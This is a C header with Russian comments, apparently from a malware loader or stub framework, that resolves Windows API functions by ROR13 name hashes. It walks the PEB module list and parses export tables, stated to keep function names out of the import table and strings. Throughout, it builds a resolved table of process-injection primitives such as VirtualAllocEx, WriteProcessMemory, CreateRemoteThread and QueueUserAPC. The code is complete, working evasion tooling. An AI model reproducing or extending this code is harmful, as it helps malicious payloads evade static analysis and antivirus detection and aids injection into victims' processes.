// api_hash.h -- API resolution via ROR13 name hashes.
//
// Заменяет прямые вызовы WinAPI на разрешение по хешу:
//   1. Никаких имён функций в IAT/строках бинарника.
//   2. Резолвер обходит PEB->Ldr для поиска модуля по hash имени.
//   3. Парсит Export Directory и хеширует каждое имя экспорта.
//   4. Сравнивает с заданным hash, возвращает указатель.
//
// Алгоритм ROR13:
//   h = 0
//   for byte b in name:
//       h = ROR(h, 13) + b
//   Модули: lowercase basename (incl ".dll").
//   Функции: case-sensitive.
//
// Использование:
//   ART_RESOLVE_APIS();                           // в начале stub_main
//   g_api.LoadLibraryW(L"foo.dll");               // вместо LoadLibraryW(...)

#ifndef CO2H_API_HASH_H
#define CO2H_API_HASH_H

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>

// =============================================================================
// Hash constants (ROR13)
// =============================================================================

// Модули (lowercase basename)
#define H_NTDLL_DLL            0xCEF6E822U
#define H_KERNEL32_DLL         0x8FECD63FU
#define H_USER32_DLL           0x542EEE26U
#define H_ADVAPI32_DLL         0x42CCF79FU

// Функции (case-sensitive)
#define H_LoadLibraryA             0xEC0E4E8EU
#define H_LoadLibraryW             0xEC0E4EA4U
#define H_GetProcAddress           0x7C0DFCAAU
#define H_GetModuleHandleA         0xD3324904U
#define H_GetModuleHandleW         0xD332491AU
#define H_VirtualAlloc             0x91AFCA54U
#define H_VirtualAllocEx           0x6E1A959CU
#define H_VirtualFree              0x030633ACU
#define H_VirtualFreeEx            0xC3B4EB78U
#define H_VirtualProtect           0x7946C61BU
#define H_HeapAlloc                0x2500383CU
#define H_HeapFree                 0x10C32616U
#define H_GetProcessHeap           0xA80EECAEU
#define H_CreateThread             0xCA2BD06BU
#define H_CreateRemoteThread       0x72BD9CDDU
#define H_ResumeThread             0x9E4A3F88U
#define H_WaitForSingleObject      0xCE05D9ADU
#define H_CloseHandle              0x0FFD97FBU
#define H_ExitProcess              0x73E2D87EU
#define H_GetCurrentProcess        0x7B8F17E6U
#define H_FlushInstructionCache    0x53120980U
#define H_SleepEx                  0xCD7A6CAEU
#define H_Sleep                    0xDB2D49B0U
#define H_GetTickCount             0xF791FB23U
#define H_CreateFileW              0x7C0017BBU
#define H_WriteFile                0xE80A791FU
#define H_DeleteFileW              0xC2FFB03BU
#define H_CreateFileMappingW       0x56C6123FU
#define H_MapViewOfFile            0x7B073C59U
#define H_UnmapViewOfFile          0xB2089259U
#define H_GetTempPathW             0x5B8ACA49U
#define H_GetTempFileNameW         0xE7AC224EU
#define H_lstrlenW                 0xDD434751U
#define H_CreateProcessW           0x16B3FE88U
#define H_TerminateProcess         0x78B5B983U
#define H_WriteProcessMemory       0xD83D6AA1U
#define H_QueueUserAPC             0x1D7F957BU
#define H_WaitForInputIdle         0x353882C7U
#define H_CreateToolhelp32Snapshot 0xE454DFEDU
#define H_Process32FirstW          0xD53992A4U
#define H_Process32NextW           0x2A523C0AU
#define H_lstrcmpiW                0x4B1E5AF1U
#define H_lstrcpyW                 0xCB9B4A11U
#define H_OpenProcess              0xEFE297C0U
#define H_InitializeProcThreadAttributeList 0xDE64CEFFU
#define H_UpdateProcThreadAttribute         0x41E5D7CBU
#define H_DeleteProcThreadAttributeList     0x1806CEBDU
#define H_CreateEventA             0x30C4B281U
#define H_SetEvent                 0xF108744EU
#define H_DisableThreadLibraryCalls 0xB142A2ABU

// =============================================================================
// Hash function
// =============================================================================

static __forceinline DWORD ah_ror13(DWORD v) {
    return (v >> 13) | (v << (32 - 13));
}

// Hash for function names (case-sensitive)
static DWORD ah_hash_ansi(const char *s) {
    DWORD h = 0;
    while (*s)
        h = ah_ror13(h) + (BYTE)*s++;
    return h;
}

// Hash for module names (UTF-16 BaseDllName, lowercase, no length prefix)
static DWORD ah_hash_wide_lower(const wchar_t *s, USHORT cb) {
    DWORD h = 0;
    USHORT n = cb / sizeof(wchar_t), i;
    for (i = 0; i < n; ++i) {
        WCHAR c = s[i];
        if (c >= L'A' && c <= L'Z') c |= 0x20;  // tolower (ASCII)
        h = ah_ror13(h) + (BYTE)c;
    }
    return h;
}

// =============================================================================
// PEB walker
// =============================================================================

static __forceinline PPEB ah_peb(void) {
#ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)(ULONG_PTR)__readfsdword(0x30);
#endif
}

// Find loaded module by hash of its BaseDllName (lowercase).
static HMODULE ah_find_module(DWORD hash) {
    PPEB peb = ah_peb();
    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
    PLIST_ENTRY cur  = head->Flink;

    while (cur != head) {
        // InMemoryOrderLinks смещён на +0x10/+0x08 в LDR_DATA_TABLE_ENTRY,
        // CONTAINING_RECORD корректно отступит назад.
        PLDR_DATA_TABLE_ENTRY ent = (PLDR_DATA_TABLE_ENTRY)
            CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (ent->FullDllName.Buffer) {
            // BaseDllName идёт сразу после FullDllName. winternl.h не содержит
            // его как поле, поэтому достанем вручную: BaseDllName UNICODE_STRING
            // = FullDllName + sizeof(UNICODE_STRING).
            UNICODE_STRING *base = (UNICODE_STRING *)((BYTE *)&ent->FullDllName
                                    + sizeof(UNICODE_STRING));
            if (base->Buffer &&
                ah_hash_wide_lower(base->Buffer, base->Length) == hash)
                return (HMODULE)ent->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

// =============================================================================
// Export resolver
// =============================================================================

// Резолвер без обработки forwarded exports (для рекурсии из ah_resolve_export).
// Возвращает NULL если экспорт forwarded или не найден.
static FARPROC ah_resolve_export_no_fwd(HMODULE mod, DWORD hash) {
    if (!mod) return NULL;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE *)mod + dos->e_lfanew);
    PIMAGE_DATA_DIRECTORY dd = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dd->VirtualAddress || !dd->Size) return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)mod + dd->VirtualAddress);
    DWORD *names = (DWORD *)((BYTE *)mod + exp->AddressOfNames);
    WORD  *ords  = (WORD  *)((BYTE *)mod + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)((BYTE *)mod + exp->AddressOfFunctions);
    DWORD exp_s = dd->VirtualAddress;
    DWORD exp_e = dd->VirtualAddress + dd->Size;
    DWORD i;

    for (i = 0; i < exp->NumberOfNames; ++i) {
        const char *fname = (const char *)((BYTE *)mod + names[i]);
        if (ah_hash_ansi(fname) == hash) {
            DWORD rva = funcs[ords[i]];
            if (rva >= exp_s && rva < exp_e)
                return NULL;  // тоже forwarded — пропускаем
            return (FARPROC)((BYTE *)mod + rva);
        }
    }
    return NULL;
}

static FARPROC ah_resolve_export(HMODULE mod, DWORD hash) {
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_DATA_DIRECTORY dd;
    PIMAGE_EXPORT_DIRECTORY exp;
    DWORD *names, *funcs;
    WORD  *ords;
    DWORD i;

    if (!mod) return NULL;
    dos = (PIMAGE_DOS_HEADER)mod;
    nt  = (PIMAGE_NT_HEADERS)((BYTE *)mod + dos->e_lfanew);
    dd  = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dd->VirtualAddress || !dd->Size) return NULL;

    exp   = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)mod + dd->VirtualAddress);
    names = (DWORD *)((BYTE *)mod + exp->AddressOfNames);
    ords  = (WORD  *)((BYTE *)mod + exp->AddressOfNameOrdinals);
    funcs = (DWORD *)((BYTE *)mod + exp->AddressOfFunctions);

    // Границы export directory — если RVA попадает сюда, это forwarded export
    DWORD exp_start = dd->VirtualAddress;
    DWORD exp_end   = dd->VirtualAddress + dd->Size;

    for (i = 0; i < exp->NumberOfNames; ++i) {
        const char *fname = (const char *)((BYTE *)mod + names[i]);
        if (ah_hash_ansi(fname) == hash) {
            DWORD rva = funcs[ords[i]];
            if (rva >= exp_start && rva < exp_end) {
                // Forwarded export: строка вида "NTDLL.RtlAllocateHeap"
                // или "api-ms-win-core-heap-l1-1-0.HeapAlloc".
                // Извлекаем имя функции после точки, хешируем,
                // ищем по ВСЕМ загруженным модулям в PEB.
                const char *fwd = (const char *)((BYTE *)mod + rva);
                const char *dot = fwd;
                while (*dot && *dot != '.') dot++;
                if (!*dot) return NULL;
                const char *fwdFunc = dot + 1;
                DWORD fwdHash = ah_hash_ansi(fwdFunc);

                // Обход InMemoryOrderModuleList — все загруженные модули
                PPEB peb = ah_peb();
                PPEB_LDR_DATA ldr = peb->Ldr;
                PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
                PLIST_ENTRY cur  = head->Flink;
                while (cur != head) {
                    PLDR_DATA_TABLE_ENTRY ent = (PLDR_DATA_TABLE_ENTRY)
                        CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
                    HMODULE tryMod = (HMODULE)ent->DllBase;
                    if (tryMod && tryMod != mod) {
                        FARPROC r = ah_resolve_export_no_fwd(tryMod, fwdHash);
                        if (r) return r;
                    }
                    cur = cur->Flink;
                }
                return NULL;
            }
            return (FARPROC)((BYTE *)mod + rva);
        }
    }
    return NULL;
}

// =============================================================================
// API function pointer table
// =============================================================================

typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef HMODULE (WINAPI *fn_LoadLibraryW)(LPCWSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef HMODULE (WINAPI *fn_GetModuleHandleW)(LPCWSTR);
typedef LPVOID  (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID  (WINAPI *fn_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fn_VirtualFree)(LPVOID, SIZE_T, DWORD);
typedef BOOL    (WINAPI *fn_VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef BOOL    (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LPVOID  (WINAPI *fn_HeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef BOOL    (WINAPI *fn_HeapFree)(HANDLE, DWORD, LPVOID);
typedef HANDLE  (WINAPI *fn_GetProcessHeap)(void);
typedef HANDLE  (WINAPI *fn_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                          LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE  (WINAPI *fn_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                                                 LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD   (WINAPI *fn_ResumeThread)(HANDLE);
typedef DWORD   (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef BOOL    (WINAPI *fn_CloseHandle)(HANDLE);
typedef VOID    (WINAPI *fn_ExitProcess)(UINT);
typedef HANDLE  (WINAPI *fn_GetCurrentProcess)(void);
typedef BOOL    (WINAPI *fn_FlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
typedef DWORD   (WINAPI *fn_SleepEx)(DWORD, BOOL);
typedef VOID    (WINAPI *fn_Sleep)(DWORD);
typedef DWORD   (WINAPI *fn_GetTickCount)(void);
typedef HANDLE  (WINAPI *fn_CreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES,
                                         DWORD, DWORD, HANDLE);
typedef BOOL    (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL    (WINAPI *fn_DeleteFileW)(LPCWSTR);
typedef HANDLE  (WINAPI *fn_CreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD,
                                                 DWORD, DWORD, LPCWSTR);
typedef LPVOID  (WINAPI *fn_MapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL    (WINAPI *fn_UnmapViewOfFile)(LPCVOID);
typedef DWORD   (WINAPI *fn_GetTempPathW)(DWORD, LPWSTR);
typedef UINT    (WINAPI *fn_GetTempFileNameW)(LPCWSTR, LPCWSTR, UINT, LPWSTR);
typedef int     (WINAPI *fn_lstrlenW)(LPCWSTR);
typedef BOOL    (WINAPI *fn_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES,
                                             LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID,
                                             LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL    (WINAPI *fn_TerminateProcess)(HANDLE, UINT);
typedef BOOL    (WINAPI *fn_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef DWORD   (WINAPI *fn_QueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef DWORD   (WINAPI *fn_WaitForInputIdle)(HANDLE, DWORD);
typedef HANDLE  (WINAPI *fn_CreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL    (WINAPI *fn_Process32FirstW)(HANDLE, LPPROCESSENTRY32W);
typedef BOOL    (WINAPI *fn_Process32NextW)(HANDLE, LPPROCESSENTRY32W);
typedef int     (WINAPI *fn_lstrcmpiW)(LPCWSTR, LPCWSTR);
typedef LPWSTR  (WINAPI *fn_lstrcpyW)(LPWSTR, LPCWSTR);
typedef HANDLE  (WINAPI *fn_OpenProcess)(DWORD, BOOL, DWORD);
typedef BOOL    (WINAPI *fn_InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL    (WINAPI *fn_UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef VOID    (WINAPI *fn_DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
typedef HANDLE  (WINAPI *fn_CreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef BOOL    (WINAPI *fn_SetEvent)(HANDLE);
typedef BOOL    (WINAPI *fn_DisableThreadLibraryCalls)(HMODULE);

// Поля префиксированы f_, чтобы не пересекаться с макросами ниже,
// которые делают X -> g_api.f_X.
typedef struct {
    fn_LoadLibraryA          f_LoadLibraryA;
    fn_LoadLibraryW          f_LoadLibraryW;
    fn_GetProcAddress        f_GetProcAddress;
    fn_GetModuleHandleA      f_GetModuleHandleA;
    fn_GetModuleHandleW      f_GetModuleHandleW;
    fn_VirtualAlloc          f_VirtualAlloc;
    fn_VirtualAllocEx        f_VirtualAllocEx;
    fn_VirtualFree           f_VirtualFree;
    fn_VirtualFreeEx         f_VirtualFreeEx;
    fn_VirtualProtect        f_VirtualProtect;
    fn_HeapAlloc             f_HeapAlloc;
    fn_HeapFree              f_HeapFree;
    fn_GetProcessHeap        f_GetProcessHeap;
    fn_CreateThread          f_CreateThread;
    fn_CreateRemoteThread    f_CreateRemoteThread;
    fn_ResumeThread          f_ResumeThread;
    fn_WaitForSingleObject   f_WaitForSingleObject;
    fn_CloseHandle           f_CloseHandle;
    fn_ExitProcess           f_ExitProcess;
    fn_GetCurrentProcess     f_GetCurrentProcess;
    fn_FlushInstructionCache f_FlushInstructionCache;
    fn_SleepEx               f_SleepEx;
    fn_Sleep                 f_Sleep;
    fn_GetTickCount          f_GetTickCount;
    fn_CreateFileW           f_CreateFileW;
    fn_WriteFile             f_WriteFile;
    fn_DeleteFileW           f_DeleteFileW;
    fn_CreateFileMappingW    f_CreateFileMappingW;
    fn_MapViewOfFile         f_MapViewOfFile;
    fn_UnmapViewOfFile       f_UnmapViewOfFile;
    fn_GetTempPathW          f_GetTempPathW;
    fn_GetTempFileNameW      f_GetTempFileNameW;
    fn_lstrlenW              f_lstrlenW;
    fn_CreateProcessW        f_CreateProcessW;
    fn_TerminateProcess      f_TerminateProcess;
    fn_WriteProcessMemory    f_WriteProcessMemory;
    fn_QueueUserAPC          f_QueueUserAPC;
    fn_WaitForInputIdle      f_WaitForInputIdle;
    fn_CreateToolhelp32Snapshot         f_CreateToolhelp32Snapshot;
    fn_Process32FirstW                  f_Process32FirstW;
    fn_Process32NextW                   f_Process32NextW;
    fn_lstrcmpiW                        f_lstrcmpiW;
    fn_lstrcpyW                         f_lstrcpyW;
    fn_OpenProcess                      f_OpenProcess;
    fn_InitializeProcThreadAttributeList f_InitializeProcThreadAttributeList;
    fn_UpdateProcThreadAttribute        f_UpdateProcThreadAttribute;
    fn_DeleteProcThreadAttributeList    f_DeleteProcThreadAttributeList;
    fn_CreateEventA                     f_CreateEventA;
    fn_SetEvent                         f_SetEvent;
    fn_DisableThreadLibraryCalls        f_DisableThreadLibraryCalls;
} ART_API;

static ART_API g_api;

// Резолвит все API. Возвращает FALSE если базовые модули не найдены.
// Конкретные функции, отсутствующие в данной сборке Windows, остаются NULL —
// стаб должен сам проверять при использовании.
static BOOL ah_resolve_all(void) {
    HMODULE k32  = ah_find_module(H_KERNEL32_DLL);
    if (!k32) return FALSE;

    /* user32.dll может быть не загружен если мы линкуемся /NODEFAULTLIB
     * и не ссылаемся ни на одну user32-функцию через IAT. Подгружаем
     * через kernel32!LoadLibraryA. */
    fn_LoadLibraryA pLLA = (fn_LoadLibraryA)ah_resolve_export(k32, H_LoadLibraryA);
    HMODULE u32 = ah_find_module(H_USER32_DLL);
    if (!u32 && pLLA) {
        /* Имя строкой -- единственная утечка имени; для совсем чистого
         * варианта можно собрать "user32.dll" побайтово в стеке. */
        static const char s_u32[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
        u32 = pLLA(s_u32);
    }

    #define R(name) g_api.f_##name = (fn_##name)ah_resolve_export(k32, H_##name)
    #define RU(name) g_api.f_##name = (fn_##name)ah_resolve_export(u32, H_##name)

    R(LoadLibraryA);
    R(LoadLibraryW);
    R(GetProcAddress);
    R(GetModuleHandleA);
    R(GetModuleHandleW);
    R(VirtualAlloc);
    R(VirtualAllocEx);
    R(VirtualFree);
    R(VirtualFreeEx);
    R(VirtualProtect);
    R(HeapAlloc);
    R(HeapFree);
    R(GetProcessHeap);
    R(CreateThread);
    R(CreateRemoteThread);
    R(ResumeThread);
    R(WaitForSingleObject);
    R(CloseHandle);
    R(ExitProcess);
    R(GetCurrentProcess);
    R(FlushInstructionCache);
    R(SleepEx);
    R(Sleep);
    R(GetTickCount);
    R(CreateFileW);
    R(WriteFile);
    R(DeleteFileW);
    R(CreateFileMappingW);
    R(MapViewOfFile);
    R(UnmapViewOfFile);
    R(GetTempPathW);
    R(GetTempFileNameW);
    R(lstrlenW);
    R(CreateProcessW);
    R(TerminateProcess);
    R(WriteProcessMemory);
    R(QueueUserAPC);
    /* WaitForInputIdle living в user32.dll -- резолвим оттуда */
    if (u32) RU(WaitForInputIdle);
    R(CreateToolhelp32Snapshot);
    R(Process32FirstW);
    R(Process32NextW);
    R(lstrcmpiW);
    R(lstrcpyW);
    R(OpenProcess);
    R(InitializeProcThreadAttributeList);
    R(UpdateProcThreadAttribute);
    R(DeleteProcThreadAttributeList);
    R(CreateEventA);
    R(SetEvent);
    R(DisableThreadLibraryCalls);

    #undef R
    #undef RU

    // Минимальная проверка: без LoadLibraryA / ExitProcess стабу делать нечего.
    return g_api.f_LoadLibraryA != NULL && g_api.f_ExitProcess != NULL;
}

// Удобный макрос для использования в начале stub_main.
#define ART_RESOLVE_APIS()                                  \
    do {                                                    \
        if (!ah_resolve_all()) {                            \
            /* нет даже ExitProcess — единственный путь:    \
               прыгнуть на ntdll!RtlExitUserThread или      \
               вернуть управление. Просто int3 / hlt. */    \
            __debugbreak();                                 \
        }                                                   \
    } while (0)

// =============================================================================
// Macros: redirect direct WinAPI calls through g_api table.
//
// ВАЖНО: эти макросы определяются ПОСЛЕ структуры ART_API и функции
// ah_resolve_all, чтобы поля и параметры не подменялись.
// Любой код, использующий эти имена ниже по include-цепочке (artifact.h
// и стабы), автоматически идёт через g_api без переписывания.
// =============================================================================

#define LoadLibraryA              g_api.f_LoadLibraryA
#define LoadLibraryW              g_api.f_LoadLibraryW
#define GetProcAddress            g_api.f_GetProcAddress
#define GetModuleHandleA          g_api.f_GetModuleHandleA
#define GetModuleHandleW          g_api.f_GetModuleHandleW
#define VirtualAlloc              g_api.f_VirtualAlloc
#define VirtualAllocEx            g_api.f_VirtualAllocEx
#define VirtualFree               g_api.f_VirtualFree
#define VirtualFreeEx             g_api.f_VirtualFreeEx
#define VirtualProtect            g_api.f_VirtualProtect
#define HeapAlloc                 g_api.f_HeapAlloc
#define HeapFree                  g_api.f_HeapFree
#define GetProcessHeap            g_api.f_GetProcessHeap
#define CreateThread              g_api.f_CreateThread
#define CreateRemoteThread        g_api.f_CreateRemoteThread
#define ResumeThread              g_api.f_ResumeThread
#define WaitForSingleObject       g_api.f_WaitForSingleObject
#define CloseHandle               g_api.f_CloseHandle
#define ExitProcess               g_api.f_ExitProcess
#define GetCurrentProcess         g_api.f_GetCurrentProcess
#define FlushInstructionCache     g_api.f_FlushInstructionCache
#define SleepEx                   g_api.f_SleepEx
#define Sleep                     g_api.f_Sleep
#define GetTickCount              g_api.f_GetTickCount
#define CreateFileW               g_api.f_CreateFileW
#define WriteFile                 g_api.f_WriteFile
#define DeleteFileW               g_api.f_DeleteFileW
#define CreateFileMappingW        g_api.f_CreateFileMappingW
#define MapViewOfFile             g_api.f_MapViewOfFile
#define UnmapViewOfFile           g_api.f_UnmapViewOfFile
#define GetTempPathW              g_api.f_GetTempPathW
#define GetTempFileNameW          g_api.f_GetTempFileNameW
#define lstrlenW                  g_api.f_lstrlenW
#define CreateProcessW            g_api.f_CreateProcessW
#define TerminateProcess          g_api.f_TerminateProcess
#define WriteProcessMemory        g_api.f_WriteProcessMemory
#define QueueUserAPC              g_api.f_QueueUserAPC
#define WaitForInputIdle          g_api.f_WaitForInputIdle
#define CreateToolhelp32Snapshot  g_api.f_CreateToolhelp32Snapshot
#define Process32FirstW           g_api.f_Process32FirstW
#define Process32NextW            g_api.f_Process32NextW
#define lstrcmpiW                 g_api.f_lstrcmpiW
#define lstrcpyW                  g_api.f_lstrcpyW
#define OpenProcess               g_api.f_OpenProcess
#define InitializeProcThreadAttributeList g_api.f_InitializeProcThreadAttributeList
#define UpdateProcThreadAttribute g_api.f_UpdateProcThreadAttribute
#define DeleteProcThreadAttributeList g_api.f_DeleteProcThreadAttributeList
#define CreateEventA              g_api.f_CreateEventA
#define SetEvent                  g_api.f_SetEvent
#define DisableThreadLibraryCalls g_api.f_DisableThreadLibraryCalls

#endif // CO2H_API_HASH_H
